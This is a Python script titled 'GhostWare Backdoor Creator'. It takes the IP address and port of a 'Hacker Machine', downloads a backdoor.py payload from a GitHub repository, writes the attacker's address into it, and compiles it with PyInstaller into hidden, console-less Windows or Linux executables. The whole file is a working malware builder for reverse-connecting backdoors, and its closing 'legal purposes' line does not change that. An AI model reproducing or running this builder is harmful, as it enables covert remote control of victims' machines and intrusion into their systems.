#!/usr/bin/env python

import requests, subprocess, re, os, tempfile, sys, optparse, argparse



owd = os.getcwd()
WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

file_name = "Reverse_GhostWare";

def get_arguments():
		parser = argparse.ArgumentParser(description='GhostWare Backdoor Creator Options')
		parser.add_argument("-i", "--ip", dest="host_ip",help="IP Address of the Hacker Machine", required=True)
		parser.add_argument("-p", "--port", dest="host_port",help="Port of the Hacker Machine", required=True)
		parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
		parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
		return parser.parse_args()


arguments = get_arguments()


try:
	os.remove('backdoor.py')
except Exception:
	pass;

def download_file(link):
    get_response = requests.get(link)
    file_name = link.split("/")[-1]
    with open(file_name, "wb") as out_file:
	    out_file.write(get_response.content)

download_file("https://github.com/Hokagenaruto123456/Lazagne123456/raw/master/backdoor.py")



with open('backdoor.py') as f:
    newText = f.read().replace('unique_chars', 'my_backdoor = Backdoor("' + arguments.host_ip + '",' + arguments.host_port + ') \n')

with open('backdoor.py', "w") as f:
    f.write(newText)


def compile_for_windows():
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", " backdoor.py"])

def compile_for_linux():
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", " backdoor.py"])

if arguments.windows:
	compile_for_windows()

if arguments.linux:
	compile_for_linux()

print("Backdoor Created Successfully")

print("\n\n[***] Please use this tool for Legal and Valid Purposes\n")
print("\t\t [***] Adios Muchachos!!!")
